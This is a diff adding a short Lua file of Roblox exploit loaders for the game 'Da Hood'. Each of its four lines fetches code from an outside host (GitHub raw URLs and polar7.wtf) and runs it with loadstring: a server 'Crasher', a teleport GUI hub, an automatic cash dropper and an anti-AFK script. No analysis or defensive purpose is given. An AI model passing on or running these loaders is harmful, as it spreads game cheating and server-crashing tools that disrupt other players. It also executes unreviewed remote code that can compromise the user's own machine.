@@ -1,0 +1,8 @@
+--Crasher
+loadstring(game:HttpGet("https://raw.githubusercontent.com/22kristina/dhcrash_gen2/main/crash", true))()
+--GUI to teleport to Club or "Secret 1v1 Island" + also for "Hyper Low GFX"
+loadstring(game:HttpGetAsync("https://polar7.wtf/Arctic/ArcticHub/Loader.txt"))()
+--Cash Dropper
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/Raycodex/Exploiting/main/Roblox/Da%20Hood%20Auto%20Cash%20Drop"), true))()
+--Anti AFK
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/matthewdu7/Lua/main/antiafk"), true))()
